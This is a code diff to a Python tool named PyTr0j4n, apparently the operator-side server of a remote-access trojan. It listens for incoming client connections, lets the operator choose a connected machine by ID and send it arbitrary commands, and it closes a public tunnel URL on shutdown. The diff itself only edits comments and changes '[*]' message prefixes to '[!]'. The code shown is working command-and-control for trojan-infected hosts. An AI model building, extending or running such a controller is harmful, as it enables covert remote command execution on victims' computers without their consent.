@@ -57,18 +57,19 @@ class PyTr0j4n:
             self.server.bind((self.host, self.port))
             self.server.listen(5)
 
-            #Listening connections in thread.
-            listening = threading.Thread(target=self.acceptConnections) 
+            #Listening connections in a thread.
+            listening = threading.Thread(target=self.acceptConnections)
+            #Start menu handler in a thread 
             handler = threading.Thread(target=self.handlerClient) 
             listening.start()
             handler.start()
            
 
         except KeyboardInterrupt:
-            print(f"{COLOR_YELLOW}[*] Server is shutting down.")
+            print(f"{COLOR_YELLOW}[!] Server is shutting down.")
             self.stopServer()
         except Exception as e:
-            print(f"{COLOR_RED}[*] Error starting the server: {e}")
+            print(f"{COLOR_RED}[!] Error starting the server: {e}")
             self.stopServer()
 
     def listConnectedClients(self):
@@ -97,16 +98,16 @@ class PyTr0j4n:
                         print(COLOR_RESET)
                         choiceId = int(input("Enter the client ID to connect with:\n"))
                         if choiceId not in self.clients:
-                            print(f"{COLOR_RED}[*] Invalid client ID. Please try again.\n")
+                            print(f"{COLOR_RED}[!] Invalid client ID. Please try again.\n")
                     except ValueError:
-                        print(f"{COLOR_RED}[*] Invalid input.\n")
+                        print(f"{COLOR_RED}[!] Invalid input.\n")
                         continue
                     clientSocket = self.clients[choiceId].get('socket')
                     clientAddress = self.clients[choiceId].get('address')
                     print(f"{COLOR_BLUE}[*] Chatting with client ID {COLOR_RESET}{choiceId}{COLOR_BLUE}, Address: {COLOR_RESET} {clientAddress[0]}:{clientAddress[1]}\n")
                     self.chatClient(clientSocket, clientAddress, choiceId)
         except Exception as e:
-            print(f"{COLOR_RED}[*] Error handling client: {e}")
+            print(f"{COLOR_RED}[!] Error handling client: {e}")
         finally:
             clientSocket.close()
             del self.clients[choiceId]
@@ -115,7 +116,7 @@ class PyTr0j4n:
         try:
             print(f"{COLOR_GREEN}[*] Accepted connection from {COLOR_RESET}{clientId} {clientAddress[0]}:{clientAddress[1]}\n")
             while True:
-                response = input("Enter command (or '/exit' to back to menu): \n")
+                response = input("[*] Enter command (or '/exit' to back to menu): \n")
                 if(response.lower() == "exit"):
                     break
                 clientSocket.sendall(response.encode('utf-8'))
@@ -124,7 +125,7 @@ class PyTr0j4n:
                     break
                 print(f"{COLOR_RESET}{data.decode('utf-8')}")
         except Exception as e:
-            print(f"{COLOR_RED}[*] Error handling client: {e}")
+            print(f"{COLOR_RED}[!] Error handling client: {e}")
         finally:
             clientSocket.close()
             del self.clients[clientId]
@@ -141,23 +142,23 @@ class PyTr0j4n:
                 #Store the client data (handler and address) with their respective ID
                 self.clients[clientId] = {'handler': clientHandler, 'address': clientAddress, 'socket': clientSocket}
         except KeyboardInterrupt:
-            print("{COLOR_YEALLOW}[*] Server is shutting down.")
+            print("{COLOR_YEALLOW}[!] Server is shutting down.")
             time.sleep(2)
             self.server.close()
         except Exception as e:
-            print(f"{COLOR_RED}[*] Error accepting connections: {e}")
+            print(f"{COLOR_RED}[!] Error accepting connections: {e}")
             time.sleep(2)
             self.server.close()
 
     def stopServer(self):
         try:
-            print(f"{COLOR_YELLOW}[*] Stopping server...")
+            print(f"{COLOR_YELLOW}[!] Stopping server...")
             if self.public_url:
                 self.public_url.close()
             if self.server:
                 self.server.close()
         except Exception as e:
-            print(f"{COLOR_RED}[*] Error stopping the server: {e}")
+            print(f"{COLOR_RED}[!] Error stopping the server: {e}")
     
 
 def main():
